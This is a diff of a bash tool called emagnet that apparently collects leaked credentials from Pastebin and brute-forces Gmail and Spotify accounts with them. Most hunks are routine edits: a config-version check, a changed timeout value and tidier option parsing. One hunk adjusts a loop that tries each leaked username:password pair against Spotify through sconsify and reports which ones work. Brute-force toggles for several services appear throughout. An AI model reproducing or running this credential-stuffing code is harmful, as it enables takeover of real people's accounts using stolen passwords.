@@ -39,16 +39,19 @@
 ####                                                                       ####
 ###############################################################################
 #################################################################################
-### Last Modified: 05:35:56 - 2020-05-20
+### Last Modified: 05:59:20 - 2020-05-20
 
 
 # First, check if we using right config file...
+emagnet_check_version() {
 if [[ -f $HOME/.config/emagnet/emagnet.conf ]]; then
 grep -qio 'version=[0-9].*' $HOME/.config/emagnet/emagnet.conf
    if [[ $? -eq "0" ]]; then 
         mv $HOME/.config/emagnet/emagnet.conf $HOME/.config/emagnet/emagnet.conf.bak
+        cp ./emagnet.conf $HOME/.config/emagnet/
    fi
 fi
+}
 
 emagnet_banner() {
 cat << "EOF"
@@ -140,7 +143,7 @@ fi
 emagnet_mustbefilled() {
   if [[ -z "$DEBUG"          ]];then sed -i "12d"  "$CONF";sed -i '12  i DEBUG=false'                                                                                                             "$CONF";fi
   if [[ -z "$PASTEBIN"       ]];then sed -i '21d'  "$CONF";sed -i '21  i PASTEBIN=https:\/\/www.pastebin.com'                                                                                     "$CONF";fi
-  if [[ -z "$TIME"           ]];then sed -i '30d'  "$CONF";sed -i "30  i TIME=150"                                                                                                                "$CONF";fi
+  if [[ -z "$TIME"           ]];then sed -i '30d'  "$CONF";sed -i "30  i TIME=200"                                                                                                                "$CONF";fi
   if [[ -z "$MYIP"           ]];then sed -i '40d'  "$CONF";sed -i "40  i MYIP=$(curl -s https://nr1.nu/i/)"                                                                                       "$CONF";fi
   if [[ -z "$WIP"            ]];then sed -i '50d'  "$CONF";sed -i '50  i WIP=https:\/\/nr1.nu\/i\/'                                                                                               "$CONF";fi
   if [[ -z "$WIP2"           ]];then sed -i '51d'  "$CONF";sed -i '51  i WIP2=https:\/\/ifconfig.co'                                                                                                                   "$CONF";fi
@@ -786,7 +789,7 @@ SPOTIFY_TARGETS="$HOME/.config/emagnet/tmp/.emagnet-passwords"
 	     while read line; do
                	SPOTIFY_USER="$(echo $line|cut -d: -f1)"
       	        SPOTIFY_PASS="$(echo $line|cut -d: -f2)"
-	           ./sconsify -username="${SPOTIFY_USER}" <<< "${SPOTIFY_PASS}" 2> /dev/null|grep -i -q "bad"
+	           sconsify -username="${SPOTIFY_USER}" <<< "${SPOTIFY_PASS}" 2> /dev/null|grep -i -q "bad"
 	             if [[ "$?" -eq "0" ]]; then
         	      echo -e "[\e[1;31m<<\e[0m] - Wrong Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"
                else
@@ -1111,6 +1114,7 @@ if ! [[ -f "$CONF" ]]; then
         timeout 2 ping -t 1 -c 1 nr1.nu &> /dev/null
         [[ "$?" -gt "0" ]] && sed -i '40d' $CONF;sed -i '40 i MYIP=127.0.0.1' $CONF || wip
         emagnet_conf
+        emagnet_check_version
 fi
 }
 
@@ -1346,8 +1350,7 @@ case "${1}" in
           sed -i 's/PBRUTEFORCE=true/PBRUTEFORCE=false/g' "$CONF"
           sed -i 's/IBRUTEFORCE=true/IBRUTEFORCE=false/g' "$CONF"
           sed -i 's/RBRUTEFORCE=true/RBRUTEFORCE=false/g' "$CONF"
-
-           if [[ "$2" = "gmail" ]]; then
+          if [[ "$2" = "gmail" ]]; then
             sed -i 's/GBRUTEFORCE=false/GBRUTEFORCE=true/g' "$CONF"
             emagnet_conf
               if [[ "$GBRUTEFORCE" = "true" ]]; then
@@ -1384,8 +1387,6 @@ case "${1}" in
               fi
 
            elif [[ "$2" = "spotify" ]]; then
-           emagnet_conf
-
              find /usr/include -name "portaudio.h" |xargs grep -v "port" &> /dev/null
                if [[ $? -ne 0 ]]; then 
                     echo -e "$basename$0: internal error -- portaudio is requrired to be installed"
@@ -1414,7 +1415,7 @@ case "${1}" in
                 echo -e "$basename$0: internal error -- unzip is required to be installed for unzip sconsify ..."
                 exit 1
               fi
-                  /usr/local/bin/sconsify -version &> /dev/null
+                    sconsify -version &> /dev/null
                         if [[ "$?" -ne "0" ]]; then
                          echo "Sconsify is required to be installed before we attacking targets.."
                            read -p "Download and install sconsify (y/N): " installsconsify
@@ -1544,8 +1545,7 @@ case "${1}" in
                 ;;
 
       "-t"|"-time"|"--time")
-                emagnet_required_stuff
-                emagnet_conf
+                emagnet_required_stuff;emagnet_conf
                 if [[ -z "$2" ]]; then echo "emagnet: internal error -- time require a number to be used";exit 1;fi
                 re='^[0-9]+$';if ! [[ $2 =~ $re ]]; then  echo -e "emagnet: internal error -- that's not a valid number" >&2;exit 1; fi
                 sed -i '30d' "$CONF";sed -i "30 i TIME=$2" "$CONF"
